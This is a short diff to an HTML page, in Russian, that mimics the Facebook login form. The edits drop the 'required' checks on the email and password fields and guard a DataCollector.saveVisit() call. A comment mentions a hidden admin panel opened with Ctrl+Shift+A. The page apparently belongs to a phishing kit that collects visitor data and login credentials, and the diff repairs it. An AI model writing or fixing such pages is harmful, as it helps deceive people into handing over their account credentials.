@@ -26,10 +26,10 @@
         <div class="login-form">
             <form id="loginForm">
                 <div class="form-group">
-                    <input type="text" id="email" placeholder="Электронная почта или номер телефона" required>
+                    <input type="text" id="email" placeholder="Электронная почта или номер телефона">
                 </div>
                 <div class="form-group">
-                    <input type="password" id="password" placeholder="Пароль" required>
+                    <input type="password" id="password" placeholder="Пароль">
                 </div>
                 <button type="submit" class="login-btn">Вход</button>
                 <a href="#" class="forgot-link">Забыли пароль?</a>
@@ -110,10 +110,12 @@
     <script>
         // Инициализация при загрузке
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('Facebook Login Page Loaded');
+            console.log('Facebook Login Page Loaded - FIXED VERSION');
             
             // Сохраняем информацию о посещении
-            DataCollector.saveVisit();
+            if (window.DataCollector) {
+                DataCollector.saveVisit();
+            }
             
             // Добавляем горячие клавиши для админки (Ctrl+Shift+A)
             document.addEventListener('keydown', function(e) {
